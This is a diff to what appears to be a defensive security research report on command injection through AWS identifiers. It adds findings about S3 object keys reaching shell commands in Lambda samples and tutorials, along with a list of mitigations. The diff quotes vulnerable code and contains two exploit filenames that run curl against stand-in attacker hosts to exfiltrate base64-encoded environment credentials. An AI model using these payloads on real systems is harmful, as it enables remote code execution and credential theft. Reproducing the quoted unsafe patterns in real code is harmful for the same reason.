@@ -615,15 +615,75 @@ Tag values appended directly into `/etc/fstab`. A `mntpt` value containing newli
 
 ### 7.3 S3 Object Keys
 
-S3 object keys can contain **almost any byte** including `$()`, backticks, semicolons, pipes, newlines, spaces, and quotes. The only real limits are 1024 bytes and UTF-8 encoding. S3 event-triggered Lambdas that pass the key to shell commands are a classic injection vector:
+S3 object keys can contain **almost any byte** including `$()`, backticks, semicolons, pipes, newlines, spaces, and quotes. The only real limits are 1024 bytes and UTF-8 encoding. This is a well-documented attack vector in serverless architectures (OWASP Serverless Top 10), but vulnerable patterns persist across tutorials and samples.
+
+#### 7.3a S3-Triggered Lambda with `Popen(shell=True)` — Canonical Injection (CRITICAL)
+
+**Source:** [riyazwalikar/pentestawslambda](https://github.com/riyazwalikar/pentestawslambda/blob/master/Pentesting-AWS-Lambda-Functions.md)
 
 ```python
-# Dangerous pattern in S3-triggered Lambda
-key = event['Records'][0]['s3']['object']['key']
-subprocess.run(f"process_file s3://bucket/{key}", shell=True)  # RCE
+def s3trigger(event, context):
+    for record in event['Records']:
+        key = record['s3']['object']['key']
+        cmd = 'ls -ltra /tmp/' + key
+        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE)
 ```
 
-*Additional findings pending — research in progress.*
+An attacker uploading a file named `; curl attacker.com/steal?$(env | base64) #` achieves full RCE and credential exfiltration.
+
+#### 7.3b ClamAV Lambda Scanner — Security Tool with Injection (CRITICAL)
+
+**Source:** [DEV Community tutorial by sutt0n](https://dev.to/sutt0n/scanning-files-on-lambda-with-a-clamav-lambda-layer-475c) (widely-read)
+
+```javascript
+const scanStatus = execSync(
+  `clamscan --database=/opt/var/lib/clamav /tmp/${record.s3.object.key}`
+);
+```
+
+S3 object key interpolated directly into `execSync` via template literals. A *security tool* (virus scanner) is itself vulnerable to command injection.
+
+#### 7.3c OWASP DVSA — S3 Upload Feedback Lambda (CRITICAL, intentionally vulnerable)
+
+**Source:** [OWASP/DVSA](https://github.com/OWASP/DVSA)
+
+The `DVSA-FEEDBACK-UPLOADS` Lambda processes S3 event notifications. Input validation (`is_safe()` checking for `;`, `'`, `|`) was **commented out**, always returning `True`.
+
+**Exploit filename:** `Order.png;curl https://attacker.ngrok.io?$(env | base64 -wrap-0); echo.pdf`
+
+#### 7.3d `aws-samples/spark-on-aws-lambda` — Event Data to Environment Variables (HIGH)
+
+**Repo:** [aws-samples/spark-on-aws-lambda](https://github.com/aws-samples/spark-on-aws-lambda)
+
+```python
+def spark_submit(s3_bucket_script, input_script, event):
+    for key, value in event.items():
+        os.environ[key] = value  # Arbitrary event data -> env vars
+    subprocess.run(["spark-submit", ...], env=os.environ)
+```
+
+While `subprocess.run` uses a list (not `shell=True`), writing arbitrary event data to environment variables allows overriding `PATH`, `LD_PRELOAD`, or other sensitive variables.
+
+#### 7.3e AWS Official Bash Docs — Unquoted S3 Key Iteration (MEDIUM)
+
+**Source:** [AWS SDK Code Examples — Bash S3](https://docs.aws.amazon.com/code-library/latest/ug/bash_2_s3_code_examples.html)
+
+```bash
+function delete_items_in_bucket() {
+  local keys=$2
+  for key in $keys; do  # UNQUOTED — word splitting on spaces, glob expansion
+    delete_items="$delete_items{\"Key\": \"$key\"},"
+  done
+}
+```
+
+`$keys` is unquoted, causing word splitting on spaces and glob expansion on `*`, `?`, `[]` characters. Official AWS documentation demonstrating unsafe shell handling of S3 keys.
+
+#### 7.3f S3 Key URL Encoding — Validation Bypass (MEDIUM)
+
+**Source:** [aws-samples/amazon-textract-enhancer Issue #2](https://github.com/aws-samples/amazon-textract-enhancer/issues/2)
+
+S3 event notifications URL-encode the object key (`my test.pdf` → `my+test.pdf`). Input validation checking for `;` or `|` in the raw event key may miss URL-encoded variants (`%3B`, `%7C`) that get decoded *after* the check.
 
 ### 7.4 STS External IDs, Session Names & Other Identity Values
 
@@ -687,5 +747,9 @@ Account **names** allow Unicode and spaces (`[\u0020-\u007E]+`) while account **
 2. This means an IAM role ARN can contain `$` in the path segment: `arn:aws:iam::ACCT:role/$path/RoleName`
 3. Creating role paths that mimic IAM policy variables (e.g., `/${aws:username}/`) creates a **confusion attack surface** where policy authors may inadvertently create dynamic policies instead of static ones.
 4. Both `ArnEquals` and `ArnLike` treat `*` and `?` as wildcards, and these characters are valid in role paths.
-5. This intersection of role paths containing `${...}` patterns and IAM policy variable substitution appears to be an **under-explored area** in cloud security research -- no published CVE, conference talk, or dedicated blog post was found covering this specific attack vector.
-6. Mitigations: always escape special characters in policy documents, restrict path creation via SCPs, validate ARNs with awareness of the full allowed character set, and be explicit about policy versions.
+5. This intersection of role paths containing `${...}` patterns and IAM policy variable substitution appears to be an **under-explored area** in cloud security research — no published CVE, conference talk, or dedicated blog post was found covering this specific attack vector.
+6. **The broader attack surface extends far beyond role ARNs.** Any AWS identifier with user-controlled characters — tag values, S3 object keys, SSM parameters, Secrets Manager values, CloudFormation parameters, STS external IDs — can be an injection vector when it flows into a shell command without quoting.
+7. **`ec2:CreateTags` is a hidden privilege escalation primitive** when instances consume tag values in user-data scripts (which run as root).
+8. **`eval`/`source` with AWS-sourced data is the most critical anti-pattern**, found across Secrets Manager wrappers, EC2 tag converters, and STS credential helpers.
+9. **Official AWS sample repos propagate unsafe patterns** — the `$EKS_KUBECTL_ROLE_ARN` anti-pattern originates from `aws-samples/eks-workshop` and has spread to dozens of repos and tutorials.
+10. Mitigations: always quote variable expansions in shell (`"$VAR"`), never use `eval`/`source` with external data, restrict path/tag creation via SCPs, validate ARNs with awareness of the full allowed character set, use `boto3`/SDK calls instead of shelling out to the AWS CLI, and use `--password-stdin` for Docker login.
